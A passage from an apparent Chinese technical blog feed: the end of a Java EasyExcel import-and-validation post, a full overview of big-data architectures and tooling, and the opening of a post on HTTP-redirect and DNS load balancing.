class="hljs-type">int</span> offset)</span> &#123;<br>        <span class="hljs-comment">// 需结合@Valid相关注解使用</span><br>        <span class="hljs-type">Validator</span> <span class="hljs-variable">validator</span> <span class="hljs-operator">=</span> Validation.buildDefaultValidatorFactory().getValidator();<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; data.size(); i++) &#123;<br>            Set&lt;ConstraintViolation&lt;T&gt;&gt; validate = validator.validate(data.get(i));<br>            <span class="hljs-keyword">if</span> (!CollectionUtils.isEmpty(validate)) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">errorMessage</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;第&quot;</span> + (i + offset) + <span class="hljs-string">&quot;行数据校验有误:&quot;</span> +<br>                        validate.stream().map(ConstraintViolation::getMessage)<br>                                .collect(Collectors.joining(<span class="hljs-string">&quot;,&quot;</span>)) + <span class="hljs-string">&quot;;&quot;</span>;<br>                errors.add(errorMessage);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> errors;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 重复行数校验</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> data 校验内容</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> offset 提示语行数偏移修正</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> 校验结果</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">checkDuplicate</span><span class="hljs-params">(List&lt;T&gt; data, <span class="hljs-type">int</span> offset)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; data.size(); i++) &#123;<br>            <span class="hljs-type">T</span> <span class="hljs-variable">itemA</span> <span class="hljs-operator">=</span> data.get(i);<br>            List&lt;Integer&gt; duplicateRows = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>            duplicateRows.add(i + offset);<br>            <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">j</span> <span class="hljs-operator">=</span> i + <span class="hljs-number">1</span>; j &lt; data.size(); j++) &#123;<br>                <span class="hljs-type">T</span> <span class="hljs-variable">itemB</span> <span class="hljs-operator">=</span> data.get(j);<br>                <span class="hljs-comment">// 比较对象请自定义重写equals和hashCode方法</span><br>                <span class="hljs-keyword">if</span> (itemA.equals(itemB)) &#123;<br>                    duplicateRows.add(j + offset);<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (duplicateRows.size() &gt;= <span class="hljs-number">1</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">errorMessage</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;第&quot;</span> + duplicateRows.stream().map(Object::toString)<br>                        .collect(Collectors.joining(<span class="hljs-string">&quot;、&quot;</span>)) + <span class="hljs-string">&quot;行数据重复;&quot;</span>;<br>                errors.add(errorMessage);<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> errors;<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> List&lt;String&gt; <span class="hljs-title function_">validateAndCheckDuplicate</span><span class="hljs-params">(List&lt;T&gt; data, <span class="hljs-type">int</span> offset)</span>&#123;<br>        List&lt;String&gt; validate = validate(data, offset);<br>        List&lt;String&gt; duplicate = checkDuplicate(data, offset);<br>        validate.addAll(duplicate);<br>        <span class="hljs-keyword">return</span> validate;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-3-导入解析Excel"><a href="#2-3-导入解析Excel" class="headerlink" title="2.3 导入解析Excel"></a>2.3 导入解析Excel</h2><p>支持导入多 <code>sheet</code> 页的数据，示例中 <code>staffinfos</code>  为拿到的解析内容。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(&quot;/import&quot;)</span><br><span class="hljs-keyword">public</span> RetDataBean <span class="hljs-title function_">easyExcelImport</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;xlsxFile&quot;)</span> MultipartFile multipartFile)</span>&#123;<br>    RetDataBean&lt;Object&gt; retDataBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RetDataBean</span>&lt;&gt;(RetcodeEnum.SUCCESS.getCode(), RetcodeEnum.SUCCESS.getMsg());<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">//输入流</span><br>        <span class="hljs-type">InputStream</span> <span class="hljs-variable">inputStream</span> <span class="hljs-operator">=</span> multipartFile.getInputStream();<br>        <span class="hljs-comment">//监视器</span><br>        <span class="hljs-type">ExcelListener</span> <span class="hljs-variable">listener</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ExcelListener</span>();<br>        <span class="hljs-type">ExcelReader</span> <span class="hljs-variable">excelReader</span> <span class="hljs-operator">=</span> EasyExcel.read(inputStream, listener).build();<br>        <span class="hljs-comment">// 第一个sheet读取类型</span><br>        <span class="hljs-type">ReadSheet</span> <span class="hljs-variable">readSheet1</span> <span class="hljs-operator">=</span> EasyExcel.readSheet(<span class="hljs-number">0</span>).head(StaffInfo.class).build();<br>        <span class="hljs-comment">// 开始读取第一个sheet</span><br>        excelReader.read(readSheet1);<br>        <span class="hljs-comment">//excel sheet0 信息</span><br>        List&lt;Object&gt; list = listener.getDatas();<br>        List&lt;StaffInfo&gt; staffInfos = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        <span class="hljs-comment">//List object for 转换 实体类</span><br>        <span class="hljs-keyword">for</span> (Object o : list) &#123;<br>            <span class="hljs-type">StaffInfo</span> <span class="hljs-variable">staffInfo</span> <span class="hljs-operator">=</span> (StaffInfo) o;<br>            staffInfos.add(staffInfo);<br>        &#125;<br>        <span class="hljs-comment">// 清空之前的数据</span><br>        listener.getDatas().clear();<br>        <span class="hljs-comment">// 开始读取第二个sheet 复制以上步骤</span><br>        <span class="hljs-type">ReadSheet</span> <span class="hljs-variable">readSheet2</span> <span class="hljs-operator">=</span> EasyExcel.readSheet(<span class="hljs-number">1</span>).head(StaffInfo.class).build();<br>        excelReader.read(readSheet2);<br>        <span class="hljs-comment">//关闭流</span><br>        excelReader.close();<br>    &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        logger.error(<span class="hljs-string">&quot;导入异常&quot;</span>,e);<br>        retDataBean.setRetCode(RetcodeEnum.Fail.getCode());<br>        retDataBean.setRetMsg(RetcodeEnum.Fail.getMsg());<br>    &#125;;<br>    <span class="hljs-keyword">return</span> retDataBean;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Java后端</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tools</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>大数据架构基础</title>
    <link href="/2022/12/23/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80/"/>
    <url>/2022/12/23/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80/</url>
    
    <content type="html"><![CDATA[<h1 id="一、大数据架构概述"><a href="#一、大数据架构概述" class="headerlink" title="一、大数据架构概述"></a>一、大数据架构概述</h1><p>以下面这张架构图为例：</p><p> <img src="/../blog-assets/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80/c433fdc697dce54bb06e83573dfb6b94.png" alt="一张图解释清楚大数据技术架构，堪称阿里的核心机密"> </p><p> 从这张大数据的整体架构图上看来，大数据的核心层应该是：<strong>数据采集层、数据存储与分析层、数据共享层、数据应用层，</strong>可能叫法有所不同，本质上的角色都大同小异。 </p><p>经过多年的发展，业界已孕育出了一些较为成熟的架构模式， 如<code>Lambda</code>架构、<code>Kappa</code>架构及<code>Smack</code>架构。</p><h2 id="1、Lambda架构"><a href="#1、Lambda架构" class="headerlink" title="1、Lambda架构"></a><strong>1、Lambda架构</strong></h2><p> Lambda架构是大数据平台里最成熟、最稳定的架构，它的核心思想是：将批处理作业和实时流处理作业分离，各自独立运行，资源互相隔离。 </p><p>下图是引自网易的猛犸大数据平台<strong>lambda</strong>架构图 </p><p> <img src="/../blog-assets/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80/20181201163352322.png" alt="在这里插入图片描述"> </p><p>标准的Lambda架构有如下几个层次：</p><ol><li><p><strong>Batch Layer</strong>：主要负责所有的批处理操作，支撑该层的技术以<code>Hive</code>、<code>Spark-SQL</code>或<code>MapReduce</code>这类批处理技术为主。另外，数据处理依赖的主数据也是在该层维护的。</p></li><li><p><strong>Serving Layer</strong>：以Batch Layer处理的结果数据为基础，对外提供低延时的数据查询和<code>ad-hoc</code>查询（即席查询）服务，Serving Layer可以认为是对Batch Layer数据访问能力上的延伸或增强。因为批处理本身是比较慢的，无法支撑实时的查询请求，从Serving Layer的角度看，Batch Layer的工作本质是一种“预计算”，即预先对大体量数据集进行处理，得到相对较小的结果集，然后由Serving Layer接手，提供实时的数据查询服务。Serving Layer既可以使用包括关系型数据库在内的传统技术，也可以使用<code>Kylin</code>、<code>Doris</code>、<code>Impala</code>或<code>Druid</code>等大数据<code>OLAP</code>产品。</p></li><li><p><strong>Speed Layer</strong>：使用流式计算技术实时处理当前数据。<strong>Speed Layer区别于Batch Layer的地方在于它能以实时或近似实时的方式处理大量的数据</strong>，但是它的局限在于只能处理当前新生成的数据，无法对全部历史数据进行操作，因为流式计算只能针对当前产生的“热数据”进行处理。Speed Layer经常使用<code>Storm</code>、<code>Spark Streaming</code>或<code>Flink</code>等大数据流计算框架。</p></li></ol><p>Lambda架构使用两条数据管道来分别应对批处理和实时处理两种场景，数据因此也有两份冗余，所以Lambda是很健壮的一种架构，但缺点是需要开发团队针对批处理和实时处理分别进行开发，同时维护两套代码，增加了工作量和维护成本。</p><h2 id="2、Kappa架构"><a href="#2、Kappa架构" class="headerlink" title="2、Kappa架构"></a>2、Kappa架构</h2><p>Kappa架构可以认为是对Lambda架构的一种简化，它使用流计算技术来统一批处理和实时处理两条通道,这样，无论从开发和维护的工作量方面，还是从数据存储方面都比Lambda架构节约很多成本。</p><p>Kappa架构在技术选型上往往需要这些组件:<br>消息队列：<code>Kafka</code>&#x2F; <code>Pulsar</code></p><p>流计算框架：<code>Flink</code>&#x2F; <code>Spark Streaming</code>&#x2F;<code>Storm</code></p><p> <img src="/../blog-assets/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80/37d5e4afb6dcb149c3f372062c5f9312.png" alt="在这里插入图片描述"> </p><p>完全使用流计算处理所有的数据对开发和数据分析的方方面面都有影响。例如，<strong>在Kappa架构下，所有的数据以流计算的方式处理之后，都将以一种追加的方式写入目标位置，而之前写入的数据也没有机会再被改动，因而变成不可变的</strong>。这种处理模式和Kafka对待数据的方式是完全一致的，本质上都是受流计算这种计算模式的影响。Kappa架构在技术选型上与Lambda架构在Speed Layer上选型是类似的，都以流计算框架为主。</p><h2 id="3、SMACK架构"><a href="#3、SMACK架构" class="headerlink" title="3、SMACK架构"></a>3、SMACK架构</h2><p><strong>SMACK</strong>架构是最近两三年兴起的一种新的架构，S、M、A、C、K分别代表了这个架构使用的5种技术:<code>Spark</code>、<code>Mesos</code>、<code>Akka</code>、<code>Cassandra</code>和<code>Kafka</code>。SMACK成功地融合了批处理和实时处理，但是它的融合方式与Kappa有很大的差别。SMACK架构的成功之处在于它充分而巧妙地利用了选型组件的特性，用一种更加自然和平滑的方式统一了批处理和实时处理。</p><p> <img src="/../blog-assets/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80/2207166a12a0aaace4d94130ffb491bd.png" alt="img"> </p><p>SMACK架构使用<code>Akka</code>进行数据采集(<code>Akka</code>可以应对高并发和实时性要求很高的场景，非常适合<code>IOT</code>领域)，然后将数据写入<code>Kafka</code>,接着使用<code>Spark Streaming</code>进行实时流处理，处理的结果和原始数据都写入<code>Cassandra</code>。到这里，所有的做法和Kappa架构是一样的。不同于Kappa架构的地方在于，SMACK架构依然保留了批处理能力，它巧妙地利用了Cassandra的多数据中心(<code>Multiple Datacenters</code>)特性将数据透明地冗余到两个<code>Cassandra</code>集群（集群1用来接收流处理结果，集群2用于批处理分析，供<code>Spark</code>(<code>Spark Core</code>或<code>Spark SQL</code>)读写。</p><p>SMACK架构之所以可行，关键是利用了相关产品的特性保证了以下重要的三点:</p><ol><li>利用Cassandra的多数据中心机制透明地实现数据冗余，为实时处理和批处理配置专门<br>的存储资源，互不影响;</li><li>利用<code>Spark-Cassandra</code>连接器的“本地数据感知”能力，在批处理时让Spark尽量读取<br>Cassandra上本地节点的数据，避免数据的网际传输;</li><li>利用<code>Mesos</code>的<code>Marathon</code>和<code>Chronos</code>来配合流式作业和批处理作业。</li></ol><p>SMACK架构既支持批处理又支持实时处理，在数据处理层面只依赖Spark,在数据存储层面只依赖Cassandra,很好地统一了技术堆栈。</p><h1 id="二、数据采集"><a href="#二、数据采集" class="headerlink" title="二、数据采集"></a>二、数据采集</h1><p>数据采集的任务就是把数据从各种数据源中采集和存储到数据存储上，在这期间可能会做一些简单的数据清洗（即<strong>ETL</strong>，将数据从来源端经过抽取<code>extract</code> 、转换<code>transform</code> 、加载<code>load</code> 至目的端的过程）。</p><h2 id="数据源的种类"><a href="#数据源的种类" class="headerlink" title="数据源的种类"></a>数据源的种类</h2><ul><li><strong>网站日志</strong>：互联网行业，网站日志占的份额最大，网站日志存储在多台网站日志服务器上，一般是在每台网站日志服务器上部署 <code>flume agent</code> ，实时地收集网站日志并存储到<code>HDFS</code>上；</li><li><strong>业务数据库</strong>：存在多种多样的业务数据库，例如 <code>mysql</code>, <code>oracle</code>,<code>sqlserver</code> 等，这时候我们迫切需要一种能从各类数据库将数据同步到<code>HDFS</code> 的工具， <code>Sqoop</code>是一种，但是<code>Sqoop</code>太过繁重，而且不管数据量大小，都需要启动<code>MapReduce</code>来执行，而且需要<code>Hadoop</code>集群的每台机器都能访问业务数据库；应对此场景，<code>DataX</code>是一个很好的解决方案，有资源的话，可以基于<code>DataX</code>之上做二次开发，就能非常好的解决 。当然<code>Flume</code> 通过配置于开发，也可以实时的从数据库中同步数据到<code>HDFS</code> ；</li><li>来自于 <code>FTP/HTTP</code> 的数据源：可能一些合作方提供数据，需要提供 <code>FTP/HTTP</code>的方式定时获取，该类型数据仍然可以使用 <code>DataX</code> 进行数据同步；</li></ul><blockquote><p><code>DataX</code> 的具体使用可参考站内文章：<a href="/2022/07/29/%E9%AB%98%E6%95%88%E6%95%B0%E6%8D%AE%E5%90%8C%E6%AD%A5%E5%B7%A5%E5%85%B7DataX%E7%9A%84%E4%BD%BF%E7%94%A8">高效数据同步工具 DataX 的使用</a> </p></blockquote><ul><li>其他数据源：比如一些手工录入的数据，只需要提供一个接口或者小程序入口，即可完成。</li></ul><h1 id="三、数据存储与分析"><a href="#三、数据存储与分析" class="headerlink" title="三、数据存储与分析"></a>三、数据存储与分析</h1><p> 毋庸置疑，<code>HDFS</code>是大数据环境下数据仓库&#x2F;数据平台最完美的数据存储解决方案。 </p><p>离线数据分析与计算，也就是对实时性要求不高的部分，在笔者看来，<code>Hive</code>还是首要的选择，丰富的数据类型、内置函数；压缩比非常高的<code>ORC</code>文件存储格式；非常方便的<code>SQL</code>支持，使得<code>Hive</code>在基于结构化数据上的统计分析远远比<code>MapReduce</code>要高效的多，一句<code>SQL</code>可以完成的需求，开发<code>MR</code>可能需要上百行代码；</p><p> <img src="/../blog-assets/%E5%A4%A7%E6%95%B0%E6%8D%AE%E6%9E%B6%E6%9E%84%E5%9F%BA%E7%A1%80/76837923d54206da968100b6f0229446.png" alt="一张图解释清楚大数据技术架构，堪称阿里的核心机密"> </p><p> <code>Spark</code>是这两年非常火的，经过实践，它的性能的确比<code>MapReduce</code>要好很多，而且和<code>Hive</code>、<code>Yarn</code>结合的越来越好，因此，必须支持使用<code>Spark</code>和<code>SparkSQL</code>来做分析和计算。因为已经有<code>Hadoop Yarn</code>，使用<code>Spark</code>其实是非常容易的，不用单独部署<code>Spark</code>集群；</p><p>上图中涉及的分析型分布式数据库MPP，业内主流为<code>Doris</code>，后续会详细讲述，此处暂且按下不表。</p><h1 id="四、数据共享"><a href="#四、数据共享" class="headerlink" title="四、数据共享"></a>四、数据共享</h1><p> 这里的数据共享，其实指的是前面数据分析与计算后的结果存放的地方，其实就是关系型数据库和NOSQL数据库。 </p><p>前面使用<code>Hive</code>、<code>MR</code>、<code>Spark</code>、<code>SparkSQL</code>分析和计算的结果，还是在<code>HDFS</code>上，但大多业务和应用不可能直接从<code>HDFS</code>上获取数据，那么就需要一个数据共享的地方，使得各业务和产品能方便的获取数据；和数据采集层到<code>HDFS</code>刚好相反，这里需要一个从<code>HDFS</code>将数据同步至其他目标数据源的工具，同样，<code>DataX</code>也可以满足。</p><p>另外，一些实时计算的结果数据可能由实时计算模块直接写入数据共享。</p><h1 id="五、数据应用"><a href="#五、数据应用" class="headerlink" title="五、数据应用"></a>五、数据应用</h1><ul><li>业务产品（CRM、ERP等）</li></ul><p>业务产品所使用的数据，已经存在于数据共享层，直接从数据共享层访问即可；</p><ul><li>报表（FineReport、业务报表）</li></ul><p>同业务产品，报表所使用的数据，一般也是已经统计汇总好的，存放于数据共享层；</p><ul><li>即席查询</li></ul><p>即席查询的用户有很多，有可能是数据开发人员、网站和产品运营人员、数据分析人员、甚至是部门老大，他们都有即席查询数据的需求； </p><p>这种即席查询通常是现有的报表和数据共享层的数据并不能满足他们的需求，需要从数据存储层直接查询。</p><p>即席查询一般是通过<code>SQL</code>完成，最大的难度在于响应速度上，使用Hive有点慢，可以用<code>SparkSQL</code>，它的响应速度较<code>Hive</code>快很多，而且能很好的与<code>Hive</code>兼容；</p><ul><li>OLAP</li></ul><p>目前，很多的<code>OLAP</code>工具不能很好的支持从<code>HDFS</code>上直接获取数据，都是通过将需要的数据同步到关系型数据库中做<code>OLAP</code>，但如果数据量巨大的话，关系型数据库显然不行；</p><p> <code>Apache Doris</code> 是一个基于 <code>MPP</code> 架构的高性能、实时的分析型数据库，以极速易用的特点被人们所熟知，仅需亚秒级响应时间即可返回海量数据下的查询结果，不仅可以支持高并发的点查询场景，也能支持高吞吐的复杂分析场景。基于此，<code>Apache Doris</code> 能够较好的满足报表分析、即席查询、统一数仓构建、数据湖联邦查询加速等使用场景，用户可以在此之上构建用户行为分析、AB 实验平台、日志检索分析、用户画像分析、订单分析等应用。</p><h1 id="六、实时计算"><a href="#六、实时计算" class="headerlink" title="六、实时计算"></a>六、实时计算</h1><p>现在业务对数据仓库实时性的需求越来越多，比如：实时的了解网站的整体流量；实时的获取一个广告的曝光和点击；在海量数据下，依靠传统数据库和传统实现方法基本完成不了，需要的是一种分布式的、高吞吐量的、延时低的、高可靠的实时计算框架；Storm在这块是比较成熟了，当然也可以使用Spark Streaming，少引入一个框架到平台中，另外，Spark Streaming比Storm延时性高那么一点点。</p><h1 id="七、任务调度与监控"><a href="#七、任务调度与监控" class="headerlink" title="七、任务调度与监控"></a>七、任务调度与监控</h1><p>在数据仓库&#x2F;数据平台中，有各种各样非常多的程序和任务，比如：数据采集任务、数据同步任务、数据分析任务等； </p><p>这些任务除了定时调度，还存在非常复杂的任务依赖关系，比如：数据分析任务必须等相应的数据采集任务完成后才能开始；数据同步任务需要等数据分析任务完成后才能开始； </p><p> 这就需要一个非常完善的任务调度与监控系统，它作为数据仓库&#x2F;数据平台的中枢，负责调度和监控所有任务的分配与运行，目前主流的任务调度框架有：</p><ul><li><strong>XXL-JOB</strong>: XXL-JOB 是一个轻量级分布式任务调度框架，支持通过 Web 页面对任务进行 CRUD 操作，支持动态修改任务状态、暂停&#x2F;恢复任务，以及终止运行中任务，支持在线配置调度任务入参和在线查看调度结果。</li><li><strong>Azkaban</strong>：Azkaban是由Linkedin公司推出的一个批量工作流任务调度器，主要用于在一个工作流内以一个特定的顺序运行一组工作和流程。官网：<a href="https://azkaban.github.io/">https://azkaban.github.io/</a></li><li><strong>Elastic Job</strong>：Elastic-Job 是一个分布式调度解决方案，由两个相互独立的子项目 Elastic-Job-Lite 和 Elastic-Job-Cloud 组成。定位为轻量级无中心化解决方案，使用 jar 包的形式提供分布式任务的协调服务。支持分布式调度协调、弹性扩容缩容、失效转移、错过执行作业重触发、并行调度、自诊断和修复等等功能特性。官网：<a href="http://elasticjob.io/">http://elasticjob.io/</a></li><li><strong>Apache Oozie</strong>：Oozie 是一个工作流调度系统，用来管理 Hadoop 任务。官网：<a href="http://oozie.apache.org/">http://oozie.apache.org/</a></li></ul><blockquote><p><code>XXL-JOB</code> 的具体使用可参考站内文章：<a href="/2022/08/24/%E5%88%86%E5%B8%83%E5%BC%8F%E4%BB%BB%E5%8A%A1%E8%B0%83%E5%BA%A6%E6%A1%86%E6%9E%B6XXL-JOB">分布式任务调度框架XXL-JOB的使用</a></p></blockquote>]]></content>
    
    
    <categories>
      
      <category>mysql</category>
      
      <category>hadoop</category>
      
      <category>spark</category>
      
    </categories>
    
    
    <tags>
      
      <tag>系统架构</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>高并发解决方案——负载均衡</title>
    <link href="/2022/08/25/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/"/>
    <url>/2022/08/25/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="一、什么是负载均衡-？"><a href="#一、什么是负载均衡-？" class="headerlink" title="一、什么是负载均衡 ？"></a>一、什么是负载均衡 ？</h1><p>当一台服务器的性能达到极限时，我们可以使用服务器集群来提高网站的整体性能。那么，在服务器集群中，需要有一台服务器充当调度者的角色，<strong>用户的所有请求都会首先由它接收，调度者再根据每台服务器的负载情况将请求分配给某一台后端服务器去处理</strong>。</p><p>那么在这个过程中，<strong>调度者如何合理分配任务，保证所有后端服务器都将性能充分发挥，从而保持服务器集群的整体性能最优，这就是负载均衡问题</strong>。</p><p> 下面详细介绍负载均衡的四种实现方式 ：</p><h2 id="1-HTTP重定向实现负载均衡"><a href="#1-HTTP重定向实现负载均衡" class="headerlink" title="1. HTTP重定向实现负载均衡"></a>1. HTTP重定向实现负载均衡</h2><h3 id="1-1-过程描述"><a href="#1-1-过程描述" class="headerlink" title="1.1 过程描述"></a>1.1 过程描述</h3><ul><li>当用户向服务器发起请求时，请求首先被集群调度者截获；</li><li>调度者根据某种分配策略，选择一台服务器，并将选中的服务器的 <code>IP</code> 地址封装在 <code>HTTP</code>响应消息头部的 <code>Location</code>字段中，并将响应消息的状态码设为 <code>302</code>，最后将这个响应消息返回给浏览器；</li><li>当浏览器收到响应消息后，解析<code>Location</code>字段，并向该<code>URL</code>发起请求，然后指定的服务器处理该用户的请求，最后将结果返回给用户。</li></ul><p>在使用HTTP重定向来实现服务器集群负载均衡的过程中，需要一台服务器作为请求调度者。用户的一项操作需要发起两次HTTP请求，<strong>一次向调度服务器发送请求</strong>，获取后端服务器的<code>IP</code>，<strong>第二次向后端服务器发送请求</strong>，获取处理结果。 </p><h3 id="1-2-调度策略"><a href="#1-2-调度策略" class="headerlink" title="1.2 调度策略"></a>1.2 调度策略</h3><p>调度服务器收到用户的请求后，究竟选择哪台后端服务器处理请求，这由调度服务器所使用的调度策略决定：</p><ul><li><strong>随机分配策略</strong> ： 当调度服务器收到用户请求后，可以随机决定使用哪台后端服务器，然后将该服务器的<code>IP</code>封装在<code>HTTP</code>响应消息的<code>Location</code>属性中，返回给浏览器即可；</li><li><strong>轮询策略(RR)</strong>  ： 调度服务器需要维护一个值，用于记录上次分配的后端服务器的<code>IP</code>。那么当新的请求到来时，调度者将请求依次分配给下一台服务器。</li></ul><p>由于轮询策略需要调度者维护一个值用于记录上次分配的服务器<code>IP</code>，因此需要额外的开销；此外，由于这个值属于互斥资源，那么<strong>当多个请求同时到来时，为了避免线程的安全问题，因此需要锁定互斥资源，从而降低了性能</strong>。而随机分配策略不需要维护额外的值，也就不存在线程安全问题，因此性能比轮询要高。 </p><h3 id="1-3-优缺点分析"><a href="#1-3-优缺点分析" class="headerlink" title="1.3 优缺点分析"></a>1.3 优缺点分析</h3><p>采用HTTP重定向来实现服务器集群的负载均衡<strong>实现起来较为容易，逻辑比较简单</strong>，但缺点也较为明显。 </p><p>在HTTP重定向方法中，调度服务器只在客户端第一次向网站发起请求的时候起作用。当调度服务器向浏览器返回响应信息后，<strong>客户端此后的操作都基于新的URL进行</strong>的(也就是后端服务器)，此后浏览器就不会与调度服务器产生关系，进而会产生如下几个问题：</p><ul><li>由于不同用户的访问时间、访问页面深度有所不同，从而每个用户对各自的后端服务器所造成的压力也不同。而调度服务器在调度时，无法知道当前用户将会对服务器造成多大的压力，<strong>因此这种方式无法实现真正意义上的负载均衡，只不过是把请求次数平均分配给每台服务器罢了</strong> ；</li><li>若分配给该用户的后端服务器出现故障，并且如果页面被浏览器缓存，那么<strong>当用户再次访问网站时，请求都会发给出现故障的服务器，从而导致访问失败</strong>。</li></ul><h2 id="2-DNS-负载均衡"><a href="#2-DNS-负载均衡" class="headerlink" title="2.  DNS 负载均衡"></a>2.  <code>DNS</code> 负载均衡</h2><h3 id="2-1-什么是-DNS-？"><a href="#2-1-什么是-DNS-？" class="headerlink" title="2.1 什么是 DNS  ？"></a>2.1 什么是 <code>DNS</code>  ？</h3><p>在了解 <code>DNS</code> 负载均衡之前，我们首先需要了解 <code>DNS</code> 域名解析的过程。 </p><p>我们知道，数据包采用<code>IP</code>地址在网络中传播，而为了方便用户记忆，我们使用域名来访问网站。那么，我们通过域名访问网站之前，首先需要将域名解析成<code>IP</code>地址，这个工作是由 <code>DNS</code> 完成的，也就是域名服务器。 </p><p>我们提交的请求不会直接发送给想要访问的网站，而是首先发给域名服务器，它会帮我们把域名解析成<code>IP</code>地址并返回给我们。我们收到<code>IP</code>之后才会向该<code>IP</code>发起请求。</p><p>那么， <code>DNS</code> 服务器有一个天然的优势，如果一个域名指向了多个<code>IP</code>地址，那么每次进行域名解析时， <code>DNS</code> 只要选一个<code>IP</code>返回给用户，就能够实现服务器集群的负载均衡。</p><h3 id="2-2-具体做法"><a href="#2-2-具体做法" class="headerlink" title="2.2 具体做法"></a>2.2 具体做法</h3><ul><li><p>首先需要将我们的域名指向多个后端服务器(将一个域名解析到多个<code>IP</code>上)；</p></li><li><p>再设置一下调度策略。</p></li></ul><p>那么我们的准备工作就完成了，接下来的负载均衡就完全由 <code>DNS</code> 服务器来实现。 当用户向我们的域名发起请求时， <code>DNS</code> 服务器会自动地根据我们事先设定好的调度策略选一个合适的<code>IP</code>返回给用户，用户再向该<code>IP</code>发起请求。   </p><h3 id="2-3-调度策略"><a href="#2-3-调度策略" class="headerlink" title="2.3 调度策略"></a>2.3 调度策略</h3><p>一般 <code>DNS</code> 提供商会提供一些调度策略供我们选择，如随机分配、轮询、根据请求者的地域分配离他最近的服务器。 </p><h3 id="2-4-动态-DNS"><a href="#2-4-动态-DNS" class="headerlink" title="2.4 动态 DNS"></a>2.4 动态 <code>DNS</code></h3><p>动态 <code>DNS</code> 能够让我们通过程序动态修改 <code>DNS</code> 服务器中的域名解析。从而当我们的监控程序发现某台服务器挂了之后，能立即通知 <code>DNS</code> 将其删掉。 </p><h3 id="2-5-优缺点分析"><a href="#2-5-优缺点分析" class="headerlink" title="2.5 优缺点分析"></a>2.5 优缺点分析</h3><p>我们先说优点：</p><ul><li><p><code>DNS</code> 负载均衡最大的优点就是<strong>配置简单</strong>。服务器集群的调度工作完全由 <code>DNS</code> 服务器承担，那么我们就可以把精力放在后端服务器上，<strong>保证他们的稳定性与吞吐量</strong>。而且完全不用担心 <code>DNS</code> 服务器的性能，即便是使用了轮询策略，它的吞吐率依然卓越；</p></li><li><p><code>DNS</code> 负载均衡具有<strong>较强的扩展性</strong>，你完全可以为一个域名解析较多的<code>IP</code>，而且不用担心性能问题。</p></li></ul><p>同时也存在以下缺点：</p><ul><li>由于把集群调度权交给了 <code>DNS</code> 服务器，从而我们没办法随心所欲地控制调度者，没办法定制调度策略；</li><li><code>DNS</code> 服务器也没办法了解每台服务器的负载情况，因此<strong>没办法实现真正意义上的负载均衡。它和HTTP重定向一样，只不过把所有请求平均分配给后端服务器罢了</strong>；</li><li>此外，当我们发现某一台后端服务器发生故障时，即使我们立即将该服务器从域名解析中去除，但由于 <code>DNS</code> 服务器会有缓存，该<code>IP</code>仍然会在 <code>DNS</code> 